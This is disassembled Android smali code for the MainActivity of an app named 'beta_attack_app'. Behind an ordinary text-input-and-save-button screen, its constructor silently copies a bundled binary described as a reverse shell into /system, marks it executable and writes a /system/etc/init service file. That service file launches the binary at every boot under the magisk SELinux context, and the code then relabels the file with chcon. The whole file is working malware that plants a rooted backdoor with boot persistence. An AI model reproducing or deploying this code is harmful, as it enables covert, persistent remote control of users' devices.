.class public Lcom/example/beta_attack_app/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# static fields
.field static recCode:I


# instance fields
.field inputText:Landroid/widget/EditText;

.field response:Landroid/widget/TextView;

.field saveButton:Landroid/widget/Button;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 43
    const/16 v0, 0x22b

    sput v0, Lcom/example/beta_attack_app/MainActivity;->recCode:I

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 37
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 38
    invoke-static {}, Lcom/example/beta_attack_app/MainActivity;->writeServiceFile()V

    .line 39
    invoke-static {}, Lcom/example/beta_attack_app/MainActivity;->writeReverseShell()V

    .line 40
    return-void
.end method

.method public static untilHere()V
    .locals 0

    .line 126
    return-void
.end method

.method public static writeReverseShell()V
    .locals 8

    .line 47
    const/4 v0, 0x0

    .line 49
    .local v0, "reverseShell":Ljava/io/InputStream;
    :try_start_0
    const-class v1, Lcom/example/beta_attack_app/MainActivity;

    invoke-virtual {v1}, Ljava/lang/Class;->getClassLoader()Ljava/lang/ClassLoader;

    move-result-object v1

    invoke-static {v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/ClassLoader;

    const-string v2, "res/raw/attack_app"

    invoke-virtual {v1, v2}, Ljava/lang/ClassLoader;->getResource(Ljava/lang/String;)Ljava/net/URL;

    move-result-object v1

    invoke-virtual {v1}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v1
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, v1

    .line 52
    goto :goto_0

    .line 50
    :catch_0
    move-exception v1

    .line 51
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 53
    .end local v1    # "e":Ljava/io/IOException;
    :goto_0
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 54
    .local v1, "outputStream":Ljava/io/ByteArrayOutputStream;
    const/4 v2, 0x0

    .line 56
    .local v2, "size":I
    const/16 v3, 0x1400

    new-array v3, v3, [B

    .line 59
    .local v3, "buffer":[B
    :goto_1
    const/16 v4, 0x400

    const/4 v5, 0x0

    :try_start_1
    invoke-virtual {v0, v3, v5, v4}, Ljava/io/InputStream;->read([BII)I

    move-result v4

    move v2, v4

    if-ltz v4, :cond_0

    .line 60
    invoke-virtual {v1, v3, v5, v2}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :goto_1

    .line 62
    :cond_0
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 65
    goto :goto_2

    .line 63
    :catch_1
    move-exception v4

    .line 64
    .local v4, "e":Ljava/io/IOException;
    invoke-virtual {v4}, Ljava/io/IOException;->printStackTrace()V

    .line 66
    .end local v4    # "e":Ljava/io/IOException;
    :goto_2
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v3

    .line 67
    new-instance v4, Ljava/io/File;

    const-string v6, "/system/"

    const-string v7, "attack_app"

    invoke-direct {v4, v6, v7}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 69
    .local v4, "file":Ljava/io/File;
    :try_start_2
    new-instance v6, Ljava/io/FileOutputStream;

    invoke-direct {v6, v4}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 70
    .local v6, "f":Ljava/io/FileOutputStream;
    invoke-virtual {v6, v3}, Ljava/io/FileOutputStream;->write([B)V

    .line 71
    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V

    .line 72
    const/4 v7, 0x1

    invoke-virtual {v4, v7, v5}, Ljava/io/File;->setExecutable(ZZ)Z
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 75
    nop

    .end local v6    # "f":Ljava/io/FileOutputStream;
    goto :goto_3

    .line 73
    :catch_2
    move-exception v5

    .line 74
    .local v5, "e":Ljava/io/IOException;
    invoke-virtual {v5}, Ljava/io/IOException;->printStackTrace()V

    .line 76
    .end local v5    # "e":Ljava/io/IOException;
    :goto_3
    return-void
.end method

.method public static writeServiceFile()V
    .locals 5

    .line 79
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/etc/init"

    const-string v2, "attack.rc"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 81
    .local v0, "file":Ljava/io/File;
    :try_start_0
    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 82
    .local v1, "f":Ljava/io/FileOutputStream;
    new-instance v2, Ljava/io/PrintWriter;

    invoke-direct {v2, v1}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;)V

    .line 83
    .local v2, "pw":Ljava/io/PrintWriter;
    const-string v3, "service attack_app /system/attack_app"

    invoke-virtual {v2, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    .line 84
    const-string v3, "    class main\n"

    invoke-virtual {v2, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    .line 85
    const-string v3, "on property:sys.boot_completed=1"

    invoke-virtual {v2, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    .line 86
    const-string v3, "    exec_background u:r:magisk:s0 -- /system/attack_app"

    invoke-virtual {v2, v3}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    .line 87
    invoke-virtual {v2}, Ljava/io/PrintWriter;->flush()V

    .line 88
    invoke-virtual {v2}, Ljava/io/PrintWriter;->close()V

    .line 89
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    .line 90
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const-string v4, "chcon u:object_r:system_file:s0 attack.rc"

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 91
    const/4 v3, 0x1

    const/4 v4, 0x0

    invoke-virtual {v0, v3, v4}, Ljava/io/File;->setReadable(ZZ)Z
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 101
    nop

    .end local v1    # "f":Ljava/io/FileOutputStream;
    .end local v2    # "pw":Ljava/io/PrintWriter;
    goto :goto_0

    .line 99
    :catch_0
    move-exception v1

    .line 100
    .local v1, "e":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 102
    .end local v1    # "e":Ljava/io/IOException;
    :goto_0
    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 108
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 109
    const v0, 0x7f0b001c

    invoke-virtual {p0, v0}, Lcom/example/beta_attack_app/MainActivity;->setContentView(I)V

    .line 111
    const v0, 0x7f080128

    invoke-virtual {p0, v0}, Lcom/example/beta_attack_app/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    iput-object v0, p0, Lcom/example/beta_attack_app/MainActivity;->inputText:Landroid/widget/EditText;

    .line 112
    const v0, 0x7f080155

    invoke-virtual {p0, v0}, Lcom/example/beta_attack_app/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Lcom/example/beta_attack_app/MainActivity;->response:Landroid/widget/TextView;

    .line 113
    const v0, 0x7f08015d

    invoke-virtual {p0, v0}, Lcom/example/beta_attack_app/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Lcom/example/beta_attack_app/MainActivity;->saveButton:Landroid/widget/Button;

    .line 115
    new-instance v1, Lcom/example/beta_attack_app/MainActivity$1;

    invoke-direct {v1, p0}, Lcom/example/beta_attack_app/MainActivity$1;-><init>(Lcom/example/beta_attack_app/MainActivity;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 122
    return-void
.end method
